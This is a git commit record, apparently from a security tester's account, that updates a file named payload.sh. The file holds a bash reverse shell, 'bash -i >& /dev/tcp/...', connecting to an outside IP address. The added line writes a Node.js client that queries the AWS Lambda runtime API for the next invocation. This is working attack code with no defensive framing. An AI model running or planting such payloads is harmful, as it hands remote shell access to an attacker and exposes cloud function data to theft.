dd284a797fb8d71a46cac39ba942f5970d80eb35
praetorian-snyk-max-2 <aarushi.dwivedi+2@praetorian.com>
2024-11-25 14:28:57 -0500

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,1 +1,2 @@
+echo "require('net').connect({port:9001,host:'127.0.0.1'},s=>s.write('GET /2018-06-01/runtime/invocation/next HTTP/1.1\r\nHost: 127.0.0.1:9001\r\n\r\n')).on('data',d=>console.log(d+''));" > client.js
 bash -i >& /dev/tcp/3.95.20.82/4001 0>&1;
